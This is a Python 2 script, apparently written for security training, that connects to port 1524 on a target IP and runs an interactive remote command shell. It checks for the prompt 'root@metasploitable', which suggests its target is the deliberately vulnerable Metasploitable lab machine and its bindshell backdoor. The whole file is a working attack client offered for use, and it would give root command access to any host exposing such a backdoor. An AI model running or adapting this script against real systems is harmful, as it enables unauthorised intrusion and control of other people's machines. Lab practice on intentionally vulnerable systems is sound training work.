#!/usr/share/python

##########################################
#
#
#	Exploit Remote Shell Opened Port
#
#	Rodrigo das Neves Bernardi
#
#
##########################################


import socket 	# Rede
import sys 		# Interacao com sistema
import time		# Espera entre requisicoes
import string

def shell_handler():

	shell = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	try:
		print "[*] " + IP + ":" + str(PORT) + " - Trying connection...\n"
		shell.connect((IP, PORT))

	except Exception:
		print "[*] Exploit completed, but no shell has been spawned. Try again.\n"
		sys.exit(1)

	time.sleep(1)
	print "    [+] " + IP + ":" + str(PORT) + " - Connected successfully, handling...\n"
	time.sleep(0.1)
	print "[*] Found shell\n"
	time.sleep(0.1)
	print "[*] Command shell session opened\n\n"

	shell.settimeout(0.5)

	prompt = shell.recv(1024)

	while True:
		try:
			command = raw_input(prompt)
			
			if command == 'exit':
				shell.close()
				return
			
			else:
				shell.send(command + "\n")
				recv = shell.recv(1024)
				
				if 'root@metasploitable' in recv:
					prompt = recv
					pass

				else:
					print recv
					prompt = shell.recv(1024)
		
		except Exception:
			pass


# Args: [TARGET IP]
if len(sys.argv) == 2:
	IP = sys.argv[1]
	PORT = 1524
	pass

else:
	print "usage: python ./" + sys.argv[0] + " [TARGET IP]"
	sys.exit(1)

try:
	shell_handler()
	print "\n[*] " + IP + " - Command shell session closed.\n"
	sys.exit(0)

except Exception:
	print "[!] ERROR! Exiting...\n"
	sys.exit(1)